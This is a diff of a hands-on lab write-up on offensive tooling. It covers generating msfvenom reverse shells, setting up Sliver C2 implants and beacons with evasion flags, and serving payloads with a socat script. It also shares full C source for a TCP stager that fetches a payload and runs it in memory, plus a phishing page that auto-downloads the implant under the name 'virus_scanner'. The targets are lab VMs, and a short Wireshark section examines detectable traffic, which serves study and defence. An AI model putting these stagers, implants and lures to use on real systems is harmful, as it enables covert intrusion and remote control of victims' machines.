@@ -32,17 +32,17 @@ $ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.130.233 LPORT=4040 -f el
 # Make the payload executable:
 $ chmod +x legitBin
 ```
-**Flags explained**d
+**Flags explained**
 - `-p`: Payload to use: `linux/x86/shell_reverse_tcp`
 - `-f`: Output format: `elf`
   - `Executable & Linkable Format` is a binary format which can be executed on the system 
-- `-o`: Where to store output: `legitBin` A.K.A `Totally Legit Binary you Should Execute!`
+- `-o`: Where to store output: `legitBin`
 
 
 > [!TIP]
 > Use tab completion to your advantage. For example, after specifying the platform and architecture `linux/x86/`, press tab a few times to get all the available options for that specific `OS/Arch`!
 >
-> Note: I'm using using the `Z Shell` A.K.A `ZSH` here!
+> Note: I'm using using the `Z Shell` A.K.A `zsh` here! This might work differently in different shells.
 
 
 In `msfconsole` we use the `multi/handler` module to set up a listener:
@@ -59,7 +59,7 @@ msf > use exploit/multi/handler
 **Explained**
 - `LHOST`: Same IP as in the payload (attackers IP)
 - `LPORT`: Port to listen to, same as in the payload
-- `payload`: Match it with the one we created the payload with
+- `payload`: I feel like this one speaks for itself 
 
 Now that the listener is running we can execute the payload on the victims machine to get a reverse shell.
 
@@ -77,7 +77,6 @@ Host is up
 $ rsync -av legitBin vagrant@192.168.130.202:/home/vagrant/
 ```
 We're sending the payload via SSH using `rsync`, but let's use our imagination here and say we did a successful phishing campaign! ;)
-
 The victim clicked a link which downloaded & executed the binary:
 
 <img width="876" height="169" alt="2026-04-30-16:27:06" src="https://github.com/user-attachments/assets/a0d66341-2b3f-481e-ac20-f9e65f27a20c" />
@@ -132,9 +131,7 @@ This makes it obvious that somebody is connected to the machine and executing sh
 
 <img width="948" height="224" alt="2026-05-01-19:29:33" src="https://github.com/user-attachments/assets/7f013b43-060f-43b5-b046-a6a82179ed2b" />
 
-
-## Sliver?
-"A powerful [command and control framework](<https://sliver.sh/>) designed to provide advanced capabilities for covertly managing and controlling remote systems"
+> "A powerful [command and control framework](<https://sliver.sh/>) designed to provide advanced capabilities for covertly managing and controlling remote systems"
 
 ## Install on kali:
 ```bash
@@ -155,13 +152,13 @@ Type `sliver-server` to launch the interactive console:
 
 
 ## Modes
-Sliver `implants` operate in `beacon` or `session` mode. **Beacon mode** basically means that the implant on the client will periodically retreive tasks from the server, execute them, and return with the results, this is an asynchronous mode of communication.
+Sliver `implants` operate in `beacon` or `session` mode. **Beacon mode** essentially means that the implant on the victim/host will periodically retreive tasks from the server, execute them, and return with the results, this is an asynchronous mode of communication.
 
-In **session mode** the implant creates a real-time session either by a **persistent connection** or **long polling**. Long polling basically means the client will check in with the server and only return after there's something to return with, compared to short polling where the client periodically sends probes to the target.
+In **session mode** the implant creates a real-time session either by a **persistent connection** or **long polling**. Long polling basically means the **client** will check in with the **server** and return only after there's something to return with, compared to short polling where the client periodically probes the target.
 
 **Q:** You talked about implants, what are they?
 
-**A:** An `implant` is the actual code that runs on the target system we want remote access to!
+**A:** An `implant` is the actual code/payload that runs on the target system we want remote access to!
 
 In order to establish a connection, we first need to **generate the implant**. We don't know how to do that yet, so in the console:
 ```console
@@ -175,11 +172,10 @@ sliver > generate -b 192.168.130.233 -o linux
 
  ⠙  Compiling, please wait ...
 ```
-**Flags:**
-- `-b` - http(s) connection string
-- `-o` - Operating system
+**Flags**
+- `-b`: http(s) connection string
+- `-o`: Operating system
 
-Wait a few seconds for it to compile and get:
 ```console
 [*] Build completed in 2m44s
 [*] Implant saved to /home/steve/box/sliver/PAINFUL_WHORL
@@ -201,7 +197,7 @@ sliver > http
 
 <img width="533" height="129" alt="2026-04-30-19:39:41" src="https://github.com/user-attachments/assets/e1ce07f8-5fbf-40c9-a21f-78c1b8332220" />
 
-Not yet :/ Let's change that! 
+Not yet. Let's change that! 
 
 If you paid attention you know it saved the **payload** to a directory I created earlier for sliver. We go to the directory and send the payload away:
 ```bash
@@ -212,8 +208,9 @@ Play along that we did some magnificent phishing campaign again and got the vict
 ## Phishing attack fantasy
 > A very simple & unsophisticated example
 
-We copy the implant to the `html` subdirectory and rename it.
+Create a `html` subdirectory and copy the implant there under a new name:
 ```bash
+$ mkdir html
 $ cp PAINFUL_WHORL html/virus_scanner
 $ ls html
 index.html  virus_scanner
@@ -244,7 +241,7 @@ Now we lure the victim to visit our webpage and click the link:
 <img width="1778" height="321" alt="2026-05-02-13:08:24" src="https://github.com/user-attachments/assets/a5314d3c-2c9e-4239-95e9-e9ab57d99697" />
 
 
-The victim starts the "virus scanner" and we type `sessions` again in the console and see the activated connection/session:
+The victim starts the "virus scanner" and we type `sessions` again in the console and notice the active connection:
 
 <img width="1858" height="197" alt="2026-04-30-19:44:33" src="https://github.com/user-attachments/assets/dd1d514b-2f1e-485a-9e2f-8134147f3e90" />
 
@@ -278,15 +275,15 @@ And there you have it, a simple `HTTP` connection. Next we'll dissect it.
   - What makes the connection detectable?
 
 ## Eavesdropping
-Fire up wireshark and start capturing.
+Fire up Wireshark and start capturing.
 
-The first suspicious thing we notice is the connection using `HTTP`l which is inherently insecure, plus it uses an old version of said protocol: `HTTP/1.1`.
+The first suspicious thing we notice is the connection using `HTTP` which is inherently insecure, plus it uses an old version of said protocol: `HTTP/1.1`.
 
 Let's take a look at an example:
 
 <img width="1868" height="392" alt="2026-04-30-19:54:24" src="https://github.com/user-attachments/assets/d8ec6b86-a685-42ef-91af-23e6676a3594" />
 
-The connection is insecure and the `URI` is looking a bit suspect as well.
+The `URI` is looking a bit suspect as well.
 
 If we `follow tcp stream` again it looks even more questionable:
 
@@ -296,7 +293,7 @@ We notice a bunch of `GET` requests and the server responding with `204 No Conte
 
 **Q:** What makes it suspect?
 
-**A:** The fact that the 204 response is meant for `PUT` and `DELETE` requests, NOT `GET`. At least that's the understanding I got from the [Mozilla developer docs](<https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204>)
+**A:** The fact that the `204` response is meant for `PUT` and `DELETE` requests, NOT `GET`. At least that's the understanding I got from the [Mozilla developer docs](<https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/204>).
 
 I found one exchange with actual data:
 
@@ -478,11 +475,12 @@ The implants generated by Sliver can get pretty hefty in size:
 
 <img width="561" height="114" alt="2026-05-02-19:48:37" src="https://github.com/user-attachments/assets/7fe36608-8fe5-4128-9caa-959f675b6585" />
 
-One way to reduce the footprint payload vise as well as detection vise is to use a stager! We're also going to switch over to beacon mode in order to limit our exposure on the network.
+One way to reduce our footprint payload vise as well as detection vise is to use a stager! We're also going to switch over to beacon mode in order to limit our exposure on the network, not just the host.
 
 **Q:** _What's a stager?_
 
-**A:** Simply put: _A small executable that establishes a connection with a C2 server and downloads the actual payload. Benefits include: It's small in size, easy to obfuscate, and more likely to evade detection. It can load multiple different payloads, so it's very dynamic in nature. Want to switch payloads on the go? The stager got your back! It can also be used to decrypt incoming (encrypted) payloads and run them completely in memory. Read more about it [here](<https://encyclopedia.kaspersky.com/glossary/stager/>) and [here](<https://blog.retracelabs.io/posts/stager101/stagers-101/>)._
+**A:** _Simply put: A small executable that establishes a connection with a C2 server and downloads the actual payload. Benefits include: It's small in size, easy to obfuscate, and more likely to evade detection. It can load multiple different payloads, so it's very dynamic in nature. Want to switch payloads on the go? The stager got your back! It can also be used to decrypt incoming (encrypted) payloads and run them completely in memory, meaning it doesn't save the payload to disk before executing. Read more about it [here](<https://encyclopedia.kaspersky.com/glossary/stager/>) and [here](<https://blog.retracelabs.io/posts/stager101/stagers-101/>)._
+
 
 **Without further ado, let's get to it!** 
 
@@ -492,11 +490,13 @@ sliver > profiles new beacon -m 192.168.130.233 -o linux -f shellcode --shellcod
 
 [*] Saved new implant profile (beacon) linuxServer
 ```
+
 You already know the flags, we're only changing format to `shellcode` and, adding the `--evasion` flag to help evade detection, and as the last argument give the profile a name.
 
 > [!NOTE]
 > For Linux/MacOS **only** the `--shellcode-compress` extra option is available when using `--format shellcode`!
 
+_Why do we do this you might ask? So that we can easily create implants etc. based on the profile, without having to retype all the details every single time. Efficiency my friend! Also less room for human error: forgeting or messing up ip addresses, formats, ports, targets etc.. This way they'll stay consistent, especially in large scale operations. This is a C2 server after all!_
 
 List the new profile:
 ```console
@@ -507,7 +507,6 @@ sliver > profiles
  linuxServer    beacon         linux/amd64   [1] mtls://192.168.130.233:8888   false   SHELLCODE   enabled       default    
 ```
 
-
 Now that we have the profile set up, we can use it to create a `stage-listener` like so:
 ```console
 sliver > stage-listener -u tcp://192.168.130.233:80 -p linuxServer
@@ -515,7 +514,7 @@ sliver > stage-listener -u tcp://192.168.130.233:80 -p linuxServer
  ⠙  Compiling, please wait ...
 [*] Job 1 (tcp) started
 ```
-We just need to specify `URL` and `profile`.
+We just need to specify `URL` and `profile` to use.
 
 
 The `stage-listener` is used to **serve the remaining shell code**, but we still need the `mtls-listener` for the **main communication channel**:
@@ -527,7 +526,6 @@ sliver > mtls
 ```
 ## Missing dependency
 <img width="416" height="43" alt="2026-05-03-00:42:55" src="https://github.com/user-attachments/assets/65d40def-5eb1-4372-84d9-1915d4536850" />
-
 (Picture from Sliver's own documentation)
 
 At this point I got stuck, because all the material I could find kept using the command:
@@ -556,7 +554,7 @@ So we'll try it out with these I guess.
 
 
 ## Problem #2
-I found out that `Sliver` doesn't really support staging for linux (no wonder all the material is just windows windows windows), but I did some digging and found a thread on this issue [here](<https://github.com/BishopFox/sliver/issues/1734>) (issue number #1734, still open today 02.05.26). Some guy in the thread had solved this, so I copied his [TCP stager](<https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>) and changed `HOST` to `192.168.130.233` and `PORT` to `8080` and compiled the stager:
+Did some more digging & found out that `Sliver` doesn't really support staging for Linux (no wonder all the material is just windows windows windows), but I did some digging and found a thread on this issue [here](<https://github.com/BishopFox/sliver/issues/1734>) (issue number #1734, still open today 02.05.26). Some guy in the thread had solved this, so I copied his [TCP stager](<https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>) and changed `HOST` to `192.168.130.233` and `PORT` to `8080` and compiled the stager:
 ```bash
 $ gcc -static linuxStager.c -o linuxStager
 
@@ -614,7 +612,7 @@ I had already spent hours upon hours doing this, and my goal was to just get thi
 sliver > jobs -k 3 
 ```
 
-Create a script to act as the payload-server / listener:
+Create a script which will serve our payload:
 ```bash
 while true; do
 	( 
@@ -624,17 +622,19 @@ while true; do
 done
 ```
 **Explained**
-- The `while true` makes sure the listener restarts automatically after each connection
-- `(` starts a subshell so we can pipe multiple commands into one output stream
-- The `printf` line gets the file size of the implant and formats it as an 8 char hex value
-- `xxd -p -r` converts the hex value into raw bytes for transmission
-- `cat`  outputs the raw payload bytes immediately after the size header
-- `)` Ends the subshell
-- `socat` serves the staged payload over `TCP` via port `8080` and rebinds the port after disconnects
-- Source: Man pages, experience and logic. For the `printf` statement I had to ask chatGPT "what does this do" 😂
+- `while true`: Ensure the listener _restarts automatically after each connection_
+- `(`: Start a `subshell` so we can _pipe multiple commands into one output stream_
+- `stat`: Get the _file size in bytes_
+  - `printf`: Format as 8 character hex value (`%08x`)
+  - `xxd -p -r`: Convert the value into raw bytes for transmission
+  - All in all: Creates a 4 byte binary header that contains the size of the payload
+- `cat`: Output the raw payload bytes after the header
+- `)` End the `subshell`
+- `socat` serve the staged payload over `TCP` via port `8080` and rebind the port after disconnects
+- Source: Man pages, experience and logic. For the `printf / (stat)` statement I had to ask chatGPT "what does this do" 😂
 
 > [!NOTE]
-> I borrowed the basic idea from the guy who wrote the TCP stager. His solution was two commands:
+> I got idea from the guy who wrote the TCP stager. His solution was two commands:
 > ```bash
 > $ printf "%08x" "$(stat --format '%s' DISABLED_ABROAD)" | xxd -p -r > DISABLED_ABROAD_staged
 > $ cat DISABLED_ABROAD_staged | nc -lvp 80 -s 192.168.45.199
@@ -646,14 +646,14 @@ Start the listener:
 └─$ ./stage-listener.sh
 ```
 
-Execute the stager on the victim (after a succesful phishing campaign.
+Execute the stager on the victim (after a succesful phishing campaign)
 ```bash
 vagrant@metasploitable3-ub1404:~$ ./linuxStager 
 vagrant@metasploitable3-ub1404:~$ 
 vagrant@metasploitable3-ub1404:~$ echo $?
 0
 ```
-But it exited immediately. Even though the exit code was 0, something was off..
+...but it exits immediately. Even though the exit code was 0, something is off..
 
 
 ## Troubleshooting
@@ -663,7 +663,7 @@ The listener is available:
 
 Okay so maybe the `stager` is broken? After all it's random code I found on github 😂
 
-So I asked chatGPT what modifications to make and it basically told me to delete a few parts. I refrained from deleting and rather commented them out and added a few debugging statements:
+So I asked chatGPT what modifications to make and it basically told me to remove a few sections. I refrained from deleting and rather commented them out and added a few debugging statements:
 ```C
 #define _GNU_SOURCE
 
@@ -811,10 +811,10 @@ And wouldn't you know the **beacon is activated**!
 
 
 ## Troubleshooting part xx
-I was still destined to execute the stager succesfully on the victims's machine. I though maybe the `static linking` is the problem here? So I compiled it dynamically and sent it away.
+I was still destined to execute the stager succesfully on the victims's machine. I thought maybe the `static linking` is the problem here? So I compiled it dynamically and sent it away.
 
 
-_Quick explanation so that you get the concept: By statically linking the executable, all required libraries (dependencies) are built into the binary itself, rather than being loaded from the host system at runtime. This increases the binary size, but also makes it more portable!_
+_Quick explanation so that you get the concept: By **statically linking** the executable, all required libraries (dependencies) are built into the binary itself, rather than being loaded from the host system at runtime. This increases the binary size, but also makes it more portable!_
 
 Test the connection first:
 
@@ -830,7 +830,7 @@ vagrant@metasploitable3-ub1404:~$ ./linuxStager
 
 I'm guessing the problem is that our target system is too old (ubuntu 14.04) to be executing a payload compiled on a rolling distro like Kali.. 😂
 
-So I set out on a hunt and found all available `GCC` [versions for Ubuntu](<https://documentation.ubuntu.com/ubuntu-for-developers/reference/availability/gcc/>)d. `Ubuntu 14.04` (Trusty Tahr) uses versions: `4.4`, `4.6`, `4.7`, `4.8`, last one being the default.
+So I set out on a hunt and found all available `GCC` [versions for Ubuntu](<https://documentation.ubuntu.com/ubuntu-for-developers/reference/availability/gcc/>). `Ubuntu 14.04` (Trusty Tahr) uses versions: `4.4`, `4.6`, `4.7`, `4.8`, last one being the default.
 
 
 I figured the least painful way to go about this this is to mimick the target environment and compile there. To achieve said task with the parameters laid out, I think containers are the solution here.
@@ -847,21 +847,15 @@ $ sudo docker run -it 13b66b
 
 root@5803c1e4b917:~# apt update && apt install gcc musl-tools -y
 
-The following NEW packages will be installed:
-   gcc gcc-4.8
-##  Some output redacted..
-
-
 ## On the host machine 
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
 └─$ docker ps       
-CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES
-5803c1e4b917   13b66b    "/bin/bash"   6 minutes ago   Up 6 minutes             reverent_northcutt
+CONTAINER ID        NAMES
+5803c1e4b917        reverent_northcutt
 
 ## Copy source file to container                                                                                                            
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
 └─$ docker cp ./linuxStager.c reverent_northcutt:/root/
-Successfully copied 4.61kB to reverent_northcutt:/root/
 
 ## Back in the container:
 
@@ -890,9 +884,9 @@ int md = syscall(SYS_memfd_create, ELF_NAME, 0);
 # so we make the necessary modifications and recompile
 
 # Got another issue which we fixed by changing
-# int md = syscall(SYS_memfd_create, ELF_NAME, 0);
+int md = syscall(SYS_memfd_create, ELF_NAME, 0);
 # TO -->
-# int md = syscall(319, ELF_NAME, 0);
+int md = syscall(319, ELF_NAME, 0);
 
 root@5803c1e4b917:~# musl-gcc -static linuxStager.c -o linuxStager
 ```
@@ -902,20 +896,18 @@ root@5803c1e4b917:~# musl-gcc -static linuxStager.c -o linuxStager
 
 A professional description:
 
-"musl-gcc is a GCC wrapper that compiles programs against musl libc instead of glibc. Musl is a lightweight C standard library designed for static linking and embedded systems. Creates smaller, portable binaries suitable for containers and minimal environments." - [Source](<https://linuxcommandlibrary.com/man/musl-gcc>)
+_"musl-gcc is a GCC wrapper that compiles programs against musl libc instead of glibc. Musl is a lightweight C standard library designed for static linking and embedded systems. Creates smaller, portable binaries suitable for containers and minimal environments." - [Source](<https://linuxcommandlibrary.com/man/musl-gcc>)_
 
 Back on Kali we copy over the `reborn stager` from the container, drop the sneaky bomb on the victim and start the listener.
 ```bash
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
 └─$ docker cp reverent_northcutt:/root/linuxStager ./linuxStagerOld    
-Successfully copied 26.6kB to /home/steve/box/sliver/payloads/linuxStagerOld
-                                                                                                                              
+                                                       
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
 └─$ rsync -av linuxStagerOld vagrant@192.168.130.202:/home/vagrant/
 
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
 └─$ ./stage-listener.sh
-
 ```
 <img width="1180" height="211" alt="2026-05-04-00:18:28" src="https://github.com/user-attachments/assets/03fd6068-bcff-4c77-a83a-69453745344b" />
 
@@ -926,8 +918,8 @@ I compiled again using `gcc` this time without `-static` and tried again:
 
 <img width="705" height="187" alt="2026-05-04-00:21:36" src="https://github.com/user-attachments/assets/0443acb7-149c-4576-81bb-7c19785b10ef" />
 
-## Not yet...
-Before moving forward I decided to **drop the full payload** on the victim to make sure it would even run:
+## Sike! Not yet...
+Before moving forward I decided to **drop the full payload** on the victim to make sure that running the actual payload itself is not the issue here:
 
 <img width="797" height="190" alt="2026-05-04-00:25:46" src="https://github.com/user-attachments/assets/87e8e960-c950-4cf3-a0d2-2881c42f2a62" />
 
@@ -938,20 +930,25 @@ And wouldn't you know our `mtls-listener` caught the beacon:
 
 So the problem is with the old ass ubuntu system not being able to run our stager. I'll come back to this another day because my time right now is running out.
 
-I shut down the ol box and spun another VM. I thought it'd be funny to use the _Cisco NetAcad cyber security lab VM_ so that's what I did. I also fired up the web server on the attacker:
+I shut down the ol box and spun up another VM. I thought it'd be funny to use the _Cisco NetAcad cyber security lab VM_ so that's what I did. I also fired up the web server on the attacker:
 ```bash
+# Compile
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
 └─$ musl-gcc -static linuxStager.c -o linuxStager   
 
+# Copy the stager to html/
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
 └─$ cp linuxStager ../html
 
+# Edit the index file
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
 └─$ cd ../html && vim index.html
 
+# Rename the stager
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/html]
 └─$ mv linuxStager virus_scanner                 
 
+# Fire up the web server
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/html]
 └─$ python3 -m http.server 4343 --directory ./
 Serving HTTP on 0.0.0.0 port 4343 (http://0.0.0.0:4343/) ...
@@ -967,7 +964,7 @@ window.onload = function(){
 };
 </script>
 ```
-As soon as the victim browses to our site the file is downloaded, don't even have to click anything (..themselves, the script does it for us) 😉:
+As soon as the victim browses to our site the file is downloaded, don't even have to click anything ....themselves, the script does it for us!
 
 <img width="1926" height="621" alt="2026-05-04-01:20:08" src="https://github.com/user-attachments/assets/554a43ac-82e3-4ffe-b98f-805af5f73aa0" />
 
@@ -985,9 +982,11 @@ As soon as the victim browses to our site the file is downloaded, don't even hav
 ```
 Nahh, not yet..
 
-I pondered and tinkered until I realized it's because we switched networks after shutting down vagrant.. 😂
+I pondered and tinkered until I realized the main issue right now is the fact that we switched networks after shutting down vagrant.. 😂
 
-So I configured the whole shabang again with new connection details:
+I figured it out when executing the stager locally and it didn't work anymore. Before it was working locally at least. So I configured the whole shabang again with new connection details.
+
+## Here we go again part xx
 ```console
 sliver > profiles new beacon -m 192.168.120.233 -o linux -f elf -e linuxServerExe2p0
 
@@ -998,16 +997,21 @@ sliver > profiles generate linuxServerExe2p0 -s ./linuxServerExe2p0
 [*] Build completed in 1m25s
 [*] Implant saved to /home/steve/box/sliver/payloads/linuxServerExe2p0
 ```
-I also edited the `TCP stager`, recompiled it, and changed the payload in the `stage-listener` script.
-
-We go again:
+Next we edit the `TCP stager` with new connection details and recompiled it. Lastly update the `stage-listener` to server our new payload.
 ```bash
+# Edit the stager and recompile
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
 └─$ musl-gcc -static linuxStager.c -o stager     
-                                                                                                                              
+
+# Send it away                                                                                                                            
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
 └─$ rsync -av stager analyst@192.168.120.219:/home/analyst/Downloads/
 
+# Edit listener
+┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
+└─$ vim stage-listener.sh
+
+# Start it
 ┌──(steve㉿flyingcarpet)-[~/box/sliver/payloads]
 └─$ ./stage-listener.sh
 ```
@@ -1038,13 +1042,14 @@ sliver (BIZARRE_CLARINET) > env
 [+] BIZARRE_CLARINET completed task 6563d8d6
 ```
 
+Fetch information about tasks:
 <img width="1918" height="788" alt="2026-05-04-02:53:50" src="https://github.com/user-attachments/assets/ca69fb08-5eb3-4531-8fdf-8236b7b64acb" />
 
 
 ## Q: Why go through all the trouble?
-Because as of now we effectively have a lightweight `TCP payload stager` that is able to fetch payloads we determine, and then execute them in memory. No writing heavy payloads to disk!
+Because as of now we effectively have a lightweight `TCP payload stager` that is able to fetch payloads we choose, and then execute them in memory. No writing heavy payloads to disk!
 
-Also, the beacon allows us the hide better in the network. A persistent connection would be flagged pretty quickly. However, come the day we need a persistent connection, we can simply give the `interactive` command, background the beacon and use the session instead:
+Also, the beacon allows us the hide better in the network. A persistent connection would be flagged pretty quickly. **However**, come the day we need a persistent connection, we can simply give the `interactive` command, background the beacon and use the session instead:
 
 ```console
 sliver (BIZARRE_CLARINET) > interactive
@@ -1068,18 +1073,21 @@ sliver > use d7624b7b
 
 
 ## Comparison
-I decided to do a small comparison before signing out. I compiled the TCP stager 3 different ways:
+I compiled the TCP stager 3 different ways:
 ```console
 17K   Gstager_dynamic
 791K  Gstager_static
 40K   Mstager_static
 ```
-`Gstager` => Compiled using `gcc` // `Mstager` => compiled using `musl-gcc`
+- `Gstager` => Compiled using `gcc`
+- `Mstager` => compiled using `musl-gcc`
 
-The winner in size is `dynamically linked` `glibc`, which is obvious as you don't have to pack all dependencies. But when you compare the statically linked binaries, `musl` is the **clear** winner here `40K` < `719K`. It's also more self-contained!
+The winner in size is `dynamically linked` `glibc`, which is obvious as you don't have to pack all dependencies. 
+
+But when you compare the statically linked binaries, `musl` is the **clear** winner here `40K` < `719K`. It's also more self-contained!
 
 Oh btw, the final `TCP stager` (Linux edition) source code for anyone interested.
-Credit to [this guy](<https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>) for getting me started!
+Credit to [this guy](<https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>) for getting us up & running!
 ```C
 #define _GNU_SOURCE
 
@@ -1099,7 +1107,6 @@ Credit to [this guy](<https://github.com/BishopFox/sliver/issues/1734#issuecomme
 int main(void)
 {
     int return_value = 1;
-
     int sd = socket(AF_INET, SOCK_CLOEXEC | SOCK_STREAM, 0);
     if (sd == -1) {
 		goto ERROR;
@@ -1133,8 +1140,9 @@ int main(void)
     while (bytes_total < elf_size) {
         bytes_partial = recv(
             sd, elf_data + bytes_total, elf_size - bytes_total, 0);
-        if (bytes_partial < 1) { goto ERROR_DATA; }
-
+        if (bytes_partial < 1) {
+			goto ERROR_DATA;
+		}
         bytes_total += bytes_partial;
     }
     // Add debug
@@ -1143,8 +1151,8 @@ int main(void)
 
     int md = memfd_create(ELF_NAME, 0);
     if (md == -1) { 
-	perror("memfd_create");
-	goto ERROR_DATA; 
+		perror("memfd_create");
+		goto ERROR_DATA; 
     }
     // Add debug
     printf("created memfd\n");
@@ -1154,8 +1162,9 @@ int main(void)
     while (bytes_total < elf_size) {
         bytes_partial = write(
             md, elf_data + bytes_total, elf_size - bytes_total);
-        if (bytes_partial < 1) { goto ERROR_MEMFD; }
-
+        if (bytes_partial < 1) {
+			goto ERROR_MEMFD;
+		}
         bytes_total += bytes_partial;
     }
 
@@ -1189,11 +1198,12 @@ ERROR:
 
 **Help received**
 - Sliver C2 | Stagers, Payload Types (Staged vs Stageless), Creating & Running Staged Payloads ([video](<https://www.youtube.com/watch?v=BYnk0jB671k>))
-- Sliver C2 docs
-- Learning Sliver C2 (06) - Stagers: Basic ([blogpost](<https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/>))
-- Sliver C2 Deployment for Red Team Engagements ([blogpost](<https://wsummerhill.github.io/redteam/2023/07/25/Sliver-C2-Usage-for-Red-Teams.html>))
-- Stagers - 101 ([blogpost](<https://blog.retracelabs.io/posts/stager101/stagers-101/>))
-- Stager ([blogpost](<https://encyclopedia.kaspersky.com/glossary/stager/>))
+- Sliver C2 [Docs](<https://sliver.sh/docs/>)
+- Learning Sliver C2 (06) - [Stagers: Basic](<https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/>)
+- Sliver C2 [Deployment for Red Team Engagements](<https://wsummerhill.github.io/redteam/2023/07/25/Sliver-C2-Usage-for-Red-Teams.html>)
+- Stagers - [101](<https://blog.retracelabs.io/posts/stager101/stagers-101/>)
+- [Stager](<https://encyclopedia.kaspersky.com/glossary/stager/>)
+- TCP Stager [source code](<https://github.com/BishopFox/sliver/issues/1734#issuecomment-2614045372>)
 
 
 
